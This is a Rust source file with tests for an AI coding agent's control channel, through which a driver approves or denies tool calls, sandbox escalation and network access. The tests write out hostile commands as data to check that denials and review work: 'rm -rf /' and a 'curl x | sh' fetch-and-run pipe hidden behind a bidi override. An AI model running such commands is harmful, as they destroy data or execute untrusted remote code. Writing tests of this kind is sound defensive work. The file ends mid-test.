//! Opt-in control channel for `-p --input-format stream-json --output
//! stream-json --stream-json-control`.
//!
//! Without the flag nothing here is reachable: a `control_request` /
//! `control_response` line is an ordinary `input_error` and a headless `Ask`
//! is denied (or answered by an opted-in `PermissionRequest` hook). With it,
//! stdin is read concurrently with the running turn so a driver can
//!
//! * answer a tool permission ask: the runner emits
//!   `{"type":"control_request","request_id":"perm_N","request":{"subtype":
//!   "can_use_tool","tool_name":...,"input":...}}` and waits at most
//!   [`ASK_TIMEOUT`] for `{"type":"control_response","response":{"subtype":
//!   "success","request_id":"perm_N","response":{"behavior":"allow"|"deny"}}}`;
//!   the input is the full reviewed text (never clipped; over 1 MiB it is
//!   denied as too large to review); sandbox escalation (`sandbox_escalation`)
//!   and unlisted network hosts (`sandbox_network`) are asked the same way;
//!   a timeout, an `error` reply, a closed stdin or a turn cancelled while
//!   waiting all deny;
//! * `interrupt` the current turn (same cancellation as the first SIGINT);
//! * `set_permission_mode`, which can only narrow the active mode, exactly
//!   like a prompt `%%mode=` directive: it never raises privilege.
//!
//! * `initialize` (Agent SDK handshake): answered with the supported request
//!   subtypes, the session id and the quick-model aliases `set_model` takes;
//!   unknown optional fields (hooks, agents, MCP servers, prompts) are ignored;
//! * `set_model`, which switches to a configured `[quick_models]` alias from
//!   the next turn, with the `/model` validation (native-state sessions refuse);
//! * an allow reply may carry `updatedInput` (the tool call's JSON arguments,
//!   an object): the call then runs with the edited arguments, which go through
//!   the tool's permission check again. An echo of the offered input is a plain
//!   allow. The ask carries the arguments as `request.tool_input` (omitted when
//!   over [`MAX_ASK_INPUT_BYTES`]).
//!
//! Every driver request is acknowledged with a `control_response` line. The
//! record shapes are published in `docs/specs/stream-json-control.md`.

use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use tokio::sync::{Notify, oneshot};

use crate::permission::checker::PermCheck;
use crate::print::HeadlessOutputPolicy;

/// Largest permission-ask input sent to the driver. The driver sees the whole
/// input (an allow authorises all of it), so anything bigger is denied as too
/// large to review rather than clipped.
pub(crate) const MAX_ASK_INPUT_BYTES: usize = 1024 * 1024;

/// Tool name of a sandbox-escalation ask.
pub(crate) const SANDBOX_ESCALATION_TOOL: &str = "sandbox_escalation";
/// Tool name of a sandbox network host:port ask.
pub(crate) const SANDBOX_NETWORK_TOOL: &str = "sandbox_network";

/// Builds the `can_use_tool` request. The driver must see exactly what an
/// allow authorises: the input is never clipped, and deceptive format
/// characters appear as visible `<U+XXXX>` markers. Oversized input is refused
/// with the reason it was not offered.
fn ask_event(id: &str, tool: &str, input: &str) -> Result<serde_json::Value, String> {
    if input.len() > MAX_ASK_INPUT_BYTES {
        return Err(format!(
            "the request is {} bytes, too large to review (limit {MAX_ASK_INPUT_BYTES}); it was not run",
            input.len()
        ));
    }
    let reviewed = crate::ui::events::sanitize_for_review(input);
    let (tool_name, _) = crate::print::bounded_progress(tool, 256);
    let mut event = serde_json::json!({
        "type": "control_request",
        "request_id": id,
        "request": {
            "subtype": "can_use_tool",
            "tool_name": tool_name,
            "input": reviewed.as_str(),
            "input_bytes": input.len(),
            "truncated": false,
        },
    });
    // The call's JSON arguments, which `updatedInput` may edit.
    if let Ok(args) = CALL_ARGS.try_with(String::clone)
        && args.len() <= MAX_ASK_INPUT_BYTES
        && let Ok(value) = serde_json::from_str::<serde_json::Value>(&args)
        && value.is_object()
    {
        event["request"]["tool_input"] = value;
    }
    Ok(event)
}

/// A driver's answer to a `can_use_tool` request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Reply {
    Allow,
    /// An allow the driver scoped to the whole run (`"scope":"run"`). Only a
    /// `sandbox_network` ask honours it; every other ask treats it as `Allow`.
    AllowForRun,
    /// An allow that replaces the tool call's arguments (`updatedInput`, a
    /// JSON object text). The edited call is permission-checked again.
    AllowWith(String),
    Deny(String),
}

/// Prefix of the tool error that asks the tool-call wrapper to run the call
/// again with the driver's `updatedInput`.
const REWRITE_SENTINEL: &str = "\u{1}mini-agent:updated-input\u{1}";
/// Why a malformed `updatedInput` denies the call it was attached to.
const UPDATED_INPUT_NOT_AN_OBJECT: &str =
    "updatedInput must be a JSON object holding the tool call's arguments; the call was not run";
/// Most edits one call accepts; each rerun is checked and asked again.
pub(crate) const MAX_INPUT_REWRITES: usize = 3;

tokio::task_local! {
    /// The JSON arguments of the tool call whose permission ask is running.
    static CALL_ARGS: String;
}

/// Reports a driver mistake to the driver as an `input_error` record (no-op
/// when the control channel is off).
pub(crate) async fn report_input_error(message: &str) {
    if let Some(state) = STATE.get() {
        let _ = state
            .output
            .emit_event(serde_json::json!({"type":"input_error","message":message}))
            .await;
    }
}

/// The note put before a result whose call ran with arguments the approver
/// changed, so the model knows they are not the ones it sent.
pub(crate) fn rewritten_notice(effective: &str) -> String {
    let (shown, _) = crate::print::bounded_progress(effective, 512);
    format!(
        "[the approver changed this call's arguments before it ran; effective arguments: {shown}]\n"
    )
}

/// The error text that makes the call wrapper rerun with `args`.
pub(crate) fn rewrite_error(args: &str) -> String {
    format!("{REWRITE_SENTINEL}{args}")
}

/// The edited arguments a tool failure asks for, if it is a rewrite request.
pub(crate) fn rewrite_request(failure: &str) -> Option<String> {
    let (_, rest) = failure.split_once(REWRITE_SENTINEL)?;
    let value = serde_json::Deserializer::from_str(rest)
        .into_iter::<serde_json::Value>()
        .next()?
        .ok()?;
    value.is_object().then(|| value.to_string())
}

/// Runs `call` with `args`, and again with the driver's edited arguments
/// whenever the call fails with a rewrite request (at most
/// [`MAX_INPUT_REWRITES`] times). `extract` reads the failure text of a result.
/// With the control channel off this is a single plain call.
pub(crate) async fn call_with_updates<T, F, Fut>(
    args: String,
    extract: impl Fn(&T) -> Option<String>,
    call: F,
) -> T
where
    F: FnMut(String) -> Fut,
    Fut: std::future::Future<Output = T>,
{
    run_updates(STATE.get().is_some(), args, extract, call).await
}

async fn run_updates<T, F, Fut>(
    enabled: bool,
    mut args: String,
    extract: impl Fn(&T) -> Option<String>,
    mut call: F,
) -> T
where
    F: FnMut(String) -> Fut,
    Fut: std::future::Future<Output = T>,
{
    if !enabled {
        return call(args).await;
    }
    let mut attempts = 0;
    loop {
        let out = CALL_ARGS.scope(args.clone(), call(args.clone())).await;
        match extract(&out).and_then(|text| rewrite_request(&text)) {
            Some(next) if attempts < MAX_INPUT_REWRITES => {
                attempts += 1;
                args = next;
            }
            _ => return out,
        }
    }
}

/// Decides what an `updatedInput` means for the call being asked about: the
/// edited arguments, or `None` when it equals what was offered (an echo) or is
/// not a JSON object.
fn edited_arguments(updated: &serde_json::Value, offered_text: &str) -> Option<String> {
    if updated.as_str() == Some(offered_text) {
        return None;
    }
    let object = updated.as_object()?;
    let current = CALL_ARGS.try_with(String::clone).ok()?;
    let current_value: serde_json::Value = serde_json::from_str(&current).ok()?;
    if current_value.as_object() == Some(object) {
        return None;
    }
    serde_json::to_string(updated).ok()
}

/// One recognised control line.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum ControlLine {
    Interrupt {
        request_id: Option<String>,
    },
    SetPermissionMode {
        request_id: Option<String>,
        mode: String,
    },
    Initialize {
        request_id: Option<String>,
    },
    SetModel {
        request_id: Option<String>,
        model: String,
    },
    Response {
        request_id: String,
        reply: Reply,
    },
    /// A `control_*` line that cannot be honoured; the text says why.
    Invalid {
        request_id: Option<String>,
        message: String,
    },
}

/// Classifies one stdin line. `None` means "not a control line" (a user
/// message, or garbage that the normal input path will report).
pub(crate) fn classify_line(line: &str) -> Option<ControlLine> {
    let value: serde_json::Value = serde_json::from_str(line).ok()?;
    let kind = value.get("type")?.as_str()?;
    let text = |value: &serde_json::Value, key: &str| {
        value
            .get(key)
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned)
    };
    match kind {
        "control_request" => {
            let request_id = text(&value, "request_id");
            let request = value.get("request");
            let subtype = request.and_then(|request| text(request, "subtype"));
            Some(match subtype.as_deref() {
                Some("interrupt") => ControlLine::Interrupt { request_id },
                Some("set_permission_mode") => match request.and_then(|r| text(r, "mode")) {
                    Some(mode) => ControlLine::SetPermissionMode { request_id, mode },
                    None => ControlLine::Invalid {
                        request_id,
                        message: "set_permission_mode needs a \"mode\"".into(),
                    },
                },
                Some("initialize") => ControlLine::Initialize { request_id },
                Some("set_model") => match request.and_then(|r| text(r, "model")) {
                    Some(model) => ControlLine::SetModel { request_id, model },
                    None => ControlLine::Invalid {
                        request_id,
                        message: "set_model needs a \"model\" (a [quick_models] alias)".into(),
                    },
                },
                other => ControlLine::Invalid {
                    request_id,
                    message: format!(
                        "unsupported control request {other:?} ({})",
                        SUPPORTED_REQUESTS.join(", ")
                    ),
                },
            })
        }
        "control_response" => {
            let response = value.get("response");
            let Some(request_id) = response.and_then(|r| text(r, "request_id")) else {
                return Some(ControlLine::Invalid {
                    request_id: None,
                    message: "control_response has no response.request_id".into(),
                });
            };
            let subtype = response.and_then(|r| text(r, "subtype"));
            let inner = response.and_then(|r| r.get("response"));
            let behavior = inner.and_then(|inner| text(inner, "behavior"));
            let reply = match (subtype.as_deref(), behavior.as_deref()) {
                (Some("success"), Some("allow")) => {
                    let updated = inner
                        .and_then(|inner| inner.get("updatedInput").or(inner.get("updated_input")))
                        .filter(|value| !value.is_null());
                    match (
                        updated,
                        inner.and_then(|inner| text(inner, "scope")).as_deref(),
                    ) {
                        // Resolved against the call's arguments in `ask_tool`.
                        (Some(updated), _) => Reply::AllowWith(updated.to_string()),
                        (None, Some("run" | "session")) => Reply::AllowForRun,
                        (None, _) => Reply::Allow,
                    }
                }
                (Some("success"), Some("deny")) => Reply::Deny(
                    inner
                        .and_then(|inner| text(inner, "message"))
                        .unwrap_or_else(|| "denied by the driver".into()),
                ),
                (Some("error"), _) => Reply::Deny(
                    response
                        .and_then(|r| text(r, "error"))
                        .unwrap_or_else(|| "the driver reported an error".into()),
                ),
                _ => {
                    return Some(ControlLine::Invalid {
                        request_id: Some(request_id),
                        message:
                            "control_response must be success with behavior allow|deny, or error"
                                .into(),
                    });
                }
            };
            Some(ControlLine::Response { request_id, reply })
        }
        _ => None,
    }
}

/// Version of the control record shapes (`docs/specs/stream-json-control.md`).
pub(crate) const PROTOCOL_VERSION: &str = "mini-agent-control/1";

/// The request subtypes the channel answers.
pub(crate) const SUPPORTED_REQUESTS: [&str; 4] = [
    "initialize",
    "interrupt",
    "set_permission_mode",
    "set_model",
];

/// What `initialize` reports and `set_model` validates against.
#[derive(Debug, Clone, Default)]
pub(crate) struct ControlInfo {
    pub session_id: String,
    /// Configured `[quick_models]` aliases, sorted.
    pub models: Vec<String>,
}

pub(crate) struct ControlState {
    info: Mutex<ControlInfo>,
    /// A `set_model` waiting for the next turn boundary.
    pending_model: Mutex<Option<String>>,
    pending: Mutex<HashMap<String, oneshot::Sender<Reply>>>,
    /// Set (under the `pending` lock) once stdin is exhausted; later asks are
    /// denied at once because no driver can answer them.
    closed: std::sync::atomic::AtomicBool,
    next_id: AtomicU64,
    /// Interrupt permit: `notify_one` stores a permit, so an interrupt that
    /// arrives before the turn first polls [`ControlState::interrupted`] is
    /// not lost.
    interrupt: Notify,
    /// User lines read from stdin whose turn has not finished (queued or
    /// running). An interrupt with none is refused instead of acknowledged.
    outstanding: AtomicU64,
    permission: Mutex<Option<PermCheck>>,
    output: HeadlessOutputPolicy,
    timeout: Duration,
}

/// Removes a still-pending ask when its waiter is dropped (cancelled turn).
struct PendingGuard<'a> {
    state: &'a ControlState,
    id: String,
}

impl Drop for PendingGuard<'_> {
    fn drop(&mut self) {
        self.state
            .pending
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .remove(&self.id);
    }
}

impl ControlState {
    pub(crate) fn new(
        output: HeadlessOutputPolicy,
        permission: Option<PermCheck>,
        timeout: Duration,
    ) -> Self {
        Self {
            info: Mutex::new(ControlInfo::default()),
            pending_model: Mutex::new(None),
            pending: Mutex::new(HashMap::new()),
            closed: std::sync::atomic::AtomicBool::new(false),
            next_id: AtomicU64::new(1),
            interrupt: Notify::new(),
            outstanding: AtomicU64::new(0),
            permission: Mutex::new(permission),
            output,
            timeout,
        }
    }

    /// Emits a `can_use_tool` request and waits for the driver. Anything other
    /// than an explicit allow within the timeout is a denial.
    pub(crate) async fn ask(&self, tool: &str, input: &str) -> Reply {
        match self.ask_raw(tool, input).await {
            // A run-scoped allow means something only for network hosts, and
            // only a tool call can take edited arguments.
            Reply::AllowForRun | Reply::AllowWith(_) => Reply::Allow,
            other => other,
        }
    }

    /// [`ControlState::ask`] for a tool call: an `updatedInput` that differs
    /// from the offered arguments comes back as [`Reply::AllowWith`].
    pub(crate) async fn ask_tool(&self, tool: &str, input: &str) -> Reply {
        match self.ask_raw(tool, input).await {
            Reply::AllowForRun => Reply::Allow,
            Reply::AllowWith(updated) => {
                let value = serde_json::from_str(&updated).unwrap_or(serde_json::Value::Null);
                // An `updatedInput` that is neither an object nor an echo of
                // the offered arguments cannot be honoured; running the
                // original call instead would hide that (mini-agent-6wtc2).
                if !value.is_object() && value.as_str() != Some(input) {
                    let message = UPDATED_INPUT_NOT_AN_OBJECT;
                    let _ = self
                        .output
                        .emit_event(serde_json::json!({"type":"input_error","message":message}))
                        .await;
                    return Reply::Deny(message.to_owned());
                }
                match edited_arguments(&value, input) {
                    Some(args) => Reply::AllowWith(args),
                    None => Reply::Allow,
                }
            }
            other => other,
        }
    }

    /// Records what `initialize` reports and `set_model` accepts.
    pub(crate) fn set_info(&self, session_id: &str, mut models: Vec<String>) {
        models.sort_unstable();
        *self.info.lock().unwrap_or_else(|e| e.into_inner()) = ControlInfo {
            session_id: session_id.to_owned(),
            models,
        };
    }

    /// The alias a driver selected with `set_model` since the last turn.
    pub(crate) fn take_model(&self) -> Option<String> {
        self.pending_model
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .take()
    }

    async fn ask_raw(&self, tool: &str, input: &str) -> Reply {
        let id = format!("perm_{}", self.next_id.fetch_add(1, Ordering::Relaxed));
        let (tx, rx) = oneshot::channel();
        {
            let mut pending = self.pending.lock().unwrap_or_else(|e| e.into_inner());
            if self.closed.load(Ordering::SeqCst) {
                return Reply::Deny("the control channel closed".into());
            }
            pending.insert(id.clone(), tx);
        }
        let _guard = PendingGuard {
            state: self,
            id: id.clone(),
        };
        let event = match ask_event(&id, tool, input) {
            Ok(event) => event,
            Err(reason) => return Reply::Deny(reason),
        };
        if self.output.emit_event(event).await.is_err() {
            return Reply::Deny("the control channel is closed".into());
        }
        // A zero timeout waits until the driver answers, stdin closes or the
        // turn is interrupted.
        if self.timeout.is_zero() {
            return match rx.await {
                Ok(reply) => reply,
                Err(_) => Reply::Deny("the control channel closed".into()),
            };
        }
        match tokio::time::timeout(self.timeout, rx).await {
            Ok(Ok(reply)) => reply,
            Ok(Err(_)) => Reply::Deny("the control channel closed".into()),
            Err(_) => Reply::Deny(format!(
                "no control_response within {}s",
                self.timeout.as_secs()
            )),
        }
    }

    /// Marks the channel closed (stdin EOF or read error): every pending ask
    /// is denied now and later asks are denied on arrival.
    pub(crate) fn close(&self) {
        let mut pending = self.pending.lock().unwrap_or_else(|e| e.into_inner());
        self.closed.store(true, Ordering::SeqCst);
        // Dropping the senders resolves each waiter to a deny.
        pending.clear();
    }

    /// Asks the driver to approve running a command outside the sandbox. The
    /// request carries the full command and justification; an allow is for
    /// this command only (no always-grant exists on this channel).
    pub(crate) async fn ask_escalation(&self, command: &str, justification: &str) -> Reply {
        self.ask(
            SANDBOX_ESCALATION_TOOL,
            &format!("run WITHOUT the sandbox\nreason: {justification}\n$ {command}"),
        )
        .await
    }

    /// Request ids of the asks still waiting for the driver.
    #[cfg(test)]
    pub(crate) fn pending_ids(&self) -> Vec<String> {
        self.pending
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .keys()
            .cloned()
            .collect()
    }

    /// Asks the driver to let the sandbox reach one `host:port`.
    pub(crate) async fn ask_network(&self, host_port: &str) -> Reply {
        match self.ask_raw(SANDBOX_NETWORK_TOOL, host_port).await {
            Reply::AllowWith(_) => Reply::Allow,
            other => other,
        }
    }

    /// Applies one classified line and returns the acknowledgement event to
    /// emit (if any).
    pub(crate) fn handle(&self, line: ControlLine) -> Option<serde_json::Value> {
        let ack = |request_id: Option<String>,
                   result: Result<Option<serde_json::Value>, String>| {
            let mut response = match &result {
                Ok(None) => serde_json::json!({"subtype": "success"}),
                Ok(Some(payload)) => {
                    serde_json::json!({"subtype": "success", "response": payload})
                }
                Err(error) => serde_json::json!({"subtype": "error", "error": error}),
            };
            if let Some(id) = request_id {
                response["request_id"] = serde_json::Value::String(id);
            }
            Some(serde_json::json!({"type": "control_response", "response": response}))
        };
        match line {
            ControlLine::Interrupt { request_id } => {
                if self.outstanding.load(Ordering::SeqCst) == 0 {
                    return ack(request_id, Err("no turn is running or queued".into()));
                }
                self.interrupt.notify_one();
                ack(request_id, Ok(None))
            }
            ControlLine::SetPermissionMode { request_id, mode } => {
                let result = self.set_mode(&mode).map(|()| None);
                ack(request_id, result)
            }
            ControlLine::Initialize { request_id } => {
                let info = self.info.lock().unwrap_or_else(|e| e.into_inner()).clone();
                ack(
                    request_id,
                    Ok(Some(serde_json::json!({
                        "protocol": PROTOCOL_VERSION,
                        "supported_requests": SUPPORTED_REQUESTS,
                        "session_id": info.session_id,
                        "commands": [],
                        "models": info.models,
                        "can_use_tool_reply": ["allow", "deny", "updatedInput"],
                    }))),
                )
            }
            ControlLine::SetModel { request_id, model } => {
                let known = self
                    .info
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .models
                    .contains(&model);
                if known {
                    *self.pending_model.lock().unwrap_or_else(|e| e.into_inner()) = Some(model);
                    ack(request_id, Ok(None))
                } else {
                    ack(
                        request_id,
                        Err(format!(
                            "unknown model {model:?}: set_model takes a configured [quick_models] alias"
                        )),
                    )
                }
            }
            ControlLine::Response { request_id, reply } => {
                let sender = self
                    .pending
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .remove(&request_id);
                match sender {
                    Some(sender) => {
                        let _ = sender.send(reply);
                        None
                    }
                    None => Some(serde_json::json!({
                        "type": "input_error",
                        "message": format!("no pending permission request {request_id:?}"),
                    })),
                }
            }
            ControlLine::Invalid {
                request_id,
                message,
            } => ack(request_id, Err(message)),
        }
    }

    fn set_mode(&self, requested: &str) -> Result<(), String> {
        let mode = crate::permission::SecurityMode::from_str(requested).ok_or_else(|| {
            format!(
                "unknown permission mode {requested:?} (accepted: {})",
                crate::permission::SecurityMode::NAMES.join(", ")
            )
        })?;
        if let Some(refusal) = crate::config::managed::mode_violation(mode) {
            return Err(refusal);
        }
        let permission = self.permission.lock().unwrap_or_else(|e| e.into_inner());
        let Some(permission) = permission.as_ref() else {
            return Err("this run has no permission checker".into());
        };
        let applied = permission
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .set_prompt_mode(mode);
        if applied {
            Ok(())
        } else {
            Err(format!(
                "{requested:?} would raise privilege above the active mode; the channel can only narrow it"
            ))
        }
    }

    /// Resolves when a driver interrupt is pending for the current line,
    /// including one that arrived before this call.
    pub(crate) async fn interrupted(&self) {
        self.interrupt.notified().await;
    }

    /// The reader forwarded one user line to the turn queue.
    pub(crate) fn line_queued(&self) {
        self.outstanding.fetch_add(1, Ordering::SeqCst);
    }

    /// The reader could not queue a line it had counted.
    pub(crate) fn line_unqueued(&self) {
        self.outstanding.fetch_sub(1, Ordering::SeqCst);
    }

    /// Guard for a line the turn loop took from the queue; dropping it ends
    /// the line and discards an interrupt permit nobody consumed.
    pub(crate) fn line_guard(&'static self) -> LineGuard {
        LineGuard(self)
    }

    fn discard_stale_interrupt(&self) {
        use futures::FutureExt;
        let _ = self.interrupt.notified().now_or_never();
    }
}

/// See [`ControlState::line_guard`].
pub(crate) struct LineGuard(&'static ControlState);

impl Drop for LineGuard {
    fn drop(&mut self) {
        self.0.outstanding.fetch_sub(1, Ordering::SeqCst);
        self.0.discard_stale_interrupt();
    }
}

/// Counts the argument prompt as a line of the control channel (no-op when the
/// channel is off).
pub(crate) fn begin_line() -> Option<LineGuard> {
    let state = STATE.get()?;
    state.line_queued();
    Some(state.line_guard())
}

/// Guard for a line just taken from the reader's queue.
pub(crate) fn claim_line() -> Option<LineGuard> {
    STATE.get().map(ControlState::line_guard)
}

static STATE: OnceLock<ControlState> = OnceLock::new();

/// Turns the channel on for this process (`--stream-json-control`).
pub(crate) fn enable(
    output: HeadlessOutputPolicy,
    permission: Option<PermCheck>,
    ask_timeout: Duration,
) {
    let _ = STATE.set(ControlState::new(output, permission, ask_timeout));
}

pub(crate) fn state() -> Option<&'static ControlState> {
    STATE.get()
}

/// Pends forever unless the channel is enabled.
pub(crate) async fn interrupted() {
    match STATE.get() {
        Some(state) => state.interrupted().await,
        None => std::future::pending().await,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn state(timeout: Duration) -> ControlState {
        // Json format: events are not written, so tests stay silent.
        ControlState::new(HeadlessOutputPolicy::legacy(false, false), None, timeout)
    }

    fn response(id: &str, behavior: &str) -> String {
        format!(
            r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"{id}","response":{{"behavior":"{behavior}","message":"no thanks"}}}}}}"#
        )
    }

    #[test]
    fn only_control_lines_are_classified_and_malformed_ones_are_reported() {
        assert_eq!(classify_line(r#"{"type":"user","content":"hi"}"#), None);
        assert_eq!(classify_line("not json"), None);
        assert_eq!(
            classify_line(
                r#"{"type":"control_request","request_id":"r1","request":{"subtype":"interrupt"}}"#
            ),
            Some(ControlLine::Interrupt {
                request_id: Some("r1".into())
            })
        );
        assert_eq!(
            classify_line(&response("perm_1", "allow")),
            Some(ControlLine::Response {
                request_id: "perm_1".into(),
                reply: Reply::Allow
            })
        );
        assert_eq!(
            classify_line(&response("perm_1", "deny")),
            Some(ControlLine::Response {
                request_id: "perm_1".into(),
                reply: Reply::Deny("no thanks".into())
            })
        );
        for bad in [
            r#"{"type":"control_request","request":{"subtype":"launch_missiles"}}"#,
            r#"{"type":"control_request","request":{"subtype":"set_permission_mode"}}"#,
            r#"{"type":"control_response","response":{"subtype":"success","request_id":"x","response":{"behavior":"maybe"}}}"#,
            r#"{"type":"control_response","response":{}}"#,
        ] {
            assert!(
                matches!(classify_line(bad), Some(ControlLine::Invalid { .. })),
                "{bad}"
            );
        }
    }

    #[tokio::test]
    async fn an_ask_waits_for_the_matching_reply_and_only_an_explicit_allow_approves() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        for (behavior, expected) in [
            ("allow", Reply::Allow),
            ("deny", Reply::Deny("no thanks".into())),
        ] {
            let waiting = std::sync::Arc::clone(&state);
            let task = tokio::spawn(async move { waiting.ask("write", "tmp/x").await });
            let id = loop {
                if let Some(id) = state.pending.lock().unwrap().keys().next().cloned() {
                    break id;
                }
                tokio::task::yield_now().await;
            };
            // A reply for a different request is rejected and does not resolve the ask.
            assert!(
                state
                    .handle(classify_line(&response("perm_999", "allow")).unwrap())
                    .is_some_and(|event| event["type"] == "input_error")
            );
            assert!(!task.is_finished());
            assert!(
                state
                    .handle(classify_line(&response(&id, behavior)).unwrap())
                    .is_none()
            );
            assert_eq!(task.await.unwrap(), expected);
            assert!(state.pending.lock().unwrap().is_empty());
        }
    }

    #[tokio::test(start_paused = true)]
    async fn an_unanswered_ask_is_denied_after_the_timeout_and_a_cancelled_one_is_forgotten() {
        let state = state(Duration::from_secs(60));
        assert!(matches!(
            state.ask("shell", "rm -rf /").await,
            Reply::Deny(reason) if reason.contains("no control_response")
        ));
        assert!(state.pending.lock().unwrap().is_empty());
        // Dropping the waiter (turn cancelled mid-ask) removes the pending entry.
        let cancelled = tokio::time::timeout(Duration::from_secs(1), state.ask("write", "x")).await;
        assert!(cancelled.is_err());
        assert!(state.pending.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn an_interrupt_is_kept_for_a_queued_turn_and_refused_when_idle() {
        let state: &'static ControlState = Box::leak(Box::new(state(Duration::from_secs(5))));
        let interrupt = |id: &str| {
            state
                .handle(ControlLine::Interrupt {
                    request_id: Some(id.into()),
                })
                .unwrap()
        };
        // Nothing queued or running: an error, and nothing is remembered.
        let refused = interrupt("i0");
        assert_eq!(refused["response"]["subtype"], "error");
        let idle = tokio::time::timeout(Duration::from_millis(50), state.interrupted()).await;
        assert!(idle.is_err());
        // A line is queued and its interrupt arrives before the turn polls.
        state.line_queued();
        let guard = state.line_guard();
        let ack = interrupt("i1");
        assert_eq!(ack["response"]["subtype"], "success");
        assert_eq!(ack["response"]["request_id"], "i1");
        tokio::time::timeout(Duration::from_secs(2), state.interrupted())
            .await
            .expect("an interrupt sent before the turn listened still cancels it");
        // An interrupt the turn never consumed does not leak into the next line.
        interrupt("i2");
        drop(guard);
        state.line_queued();
        let _next = state.line_guard();
        let leaked = tokio::time::timeout(Duration::from_millis(50), state.interrupted()).await;
        assert!(leaked.is_err());
        // A waiting turn is woken too.
        let turn = tokio::spawn(state.interrupted());
        tokio::time::sleep(Duration::from_millis(20)).await;
        interrupt("i3");
        tokio::time::timeout(Duration::from_secs(2), turn)
            .await
            .expect("the waiting turn is interrupted")
            .unwrap();
    }

    #[test]
    fn permission_mode_changes_can_only_narrow() {
        use crate::permission::SecurityMode;
        let checker = crate::permission::checker::PermissionChecker::new(
            &crate::permission::PermissionConfigs::default(),
            SecurityMode::Guarded,
            std::env::current_dir().ok(),
            Some(SecurityMode::NAMES.iter().map(|n| n.to_string()).collect()),
        )
        .unwrap();
        let permission: PermCheck = std::sync::Arc::new(std::sync::Mutex::new(checker));
        let state = ControlState::new(
            HeadlessOutputPolicy::legacy(false, false),
            Some(permission.clone()),
            Duration::from_secs(1),
        );
        let set = |mode: &str| {
            state
                .handle(ControlLine::SetPermissionMode {
                    request_id: None,
                    mode: mode.into(),
                })
                .unwrap()
        };
        assert_eq!(set("readonly")["response"]["subtype"], "success");
        assert_eq!(permission.lock().unwrap().mode(), SecurityMode::ReadOnly);
        let refused = set("yolo");
        assert_eq!(refused["response"]["subtype"], "error");
        assert!(
            refused["response"]["error"]
                .as_str()
                .unwrap()
                .contains("narrow")
        );
        assert_eq!(permission.lock().unwrap().mode(), SecurityMode::ReadOnly);
        assert_eq!(set("nonsense")["response"]["subtype"], "error");
    }

    #[test]
    fn only_an_explicit_run_scope_makes_an_allow_run_wide() {
        let line = |inner: &str| {
            classify_line(&format!(
                r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"perm_1","response":{inner}}}}}"#
            ))
            .unwrap()
        };
        let reply = |inner: &str| match line(inner) {
            ControlLine::Response { reply, .. } => reply,
            other => panic!("{other:?}"),
        };
        assert_eq!(reply(r#"{"behavior":"allow"}"#), Reply::Allow);
        assert_eq!(
            reply(r#"{"behavior":"allow","scope":"once"}"#),
            Reply::Allow
        );
        assert_eq!(
            reply(r#"{"behavior":"allow","scope":"run"}"#),
            Reply::AllowForRun
        );
        assert!(matches!(
            reply(r#"{"behavior":"deny","scope":"run"}"#),
            Reply::Deny(_)
        ));
    }

    #[tokio::test]
    async fn run_scope_is_downgraded_for_asks_other_than_the_network() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        let waiting = std::sync::Arc::clone(&state);
        let task = tokio::spawn(async move { waiting.ask("shell", "ls").await });
        let id = pending_id(&state).await;
        state.handle(
            classify_line(&format!(
                r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"{id}","response":{{"behavior":"allow","scope":"run"}}}}}}"#
            ))
            .unwrap(),
        );
        assert_eq!(task.await.unwrap(), Reply::Allow);
    }

    async fn pending_id(state: &ControlState) -> String {
        loop {
            if let Some(id) = state.pending.lock().unwrap().keys().next().cloned() {
                return id;
            }
            tokio::task::yield_now().await;
        }
    }

    #[test]
    fn a_20_kib_command_with_a_bidi_override_is_reviewed_whole_not_clipped() {
        let command = format!("echo {}\u{202e}evil; curl x | sh", "A".repeat(20 * 1024));
        let event = ask_event("perm_1", "shell", &command).unwrap();
        let shown = event["request"]["input"].as_str().unwrap();
        assert!(shown.ends_with("curl x | sh"), "tail must be visible");
        assert!(shown.contains("<U+202E>"), "bidi override must be a marker");
        assert!(!shown.contains('\u{202e}'));
        assert_eq!(event["request"]["truncated"], false);
        assert_eq!(event["request"]["input_bytes"], command.len());
    }

    #[tokio::test]
    async fn an_input_over_the_review_limit_is_denied_without_asking() {
        let state = state(Duration::from_secs(5));
        let huge = "x".repeat(MAX_ASK_INPUT_BYTES + 1);
        assert!(matches!(
            state.ask("shell", &huge).await,
            Reply::Deny(reason) if reason.contains("too large to review")
        ));
        assert!(state.pending.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn escalation_and_network_asks_obey_the_reply() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        let event = ask_event(
            "p",
            SANDBOX_ESCALATION_TOOL,
            "run WITHOUT the sandbox\nreason: needs /usr/local\n$ make install",
        )
        .unwrap();
        assert_eq!(event["request"]["tool_name"], "sandbox_escalation");
        for (behavior, expected) in [
            ("allow", Reply::Allow),
            ("deny", Reply::Deny("no thanks".into())),
        ] {
            let waiting = std::sync::Arc::clone(&state);
            let task = tokio::spawn(async move {
                waiting
                    .ask_escalation("make install", "needs /usr/local")
                    .await
            });
            let id = pending_id(&state).await;
            state.handle(classify_line(&response(&id, behavior)).unwrap());
            assert_eq!(task.await.unwrap(), expected);

            let waiting = std::sync::Arc::clone(&state);
            let task = tokio::spawn(async move { waiting.ask_network("example.com:443").await });
            let id = pending_id(&state).await;
            state.handle(classify_line(&response(&id, behavior)).unwrap());
            assert_eq!(task.await.unwrap(), expected);
        }
    }

    #[tokio::test(start_paused = true)]
    async fn escalation_and_network_asks_time_out_as_denials() {
        let state = state(Duration::from_secs(7));
        assert!(matches!(
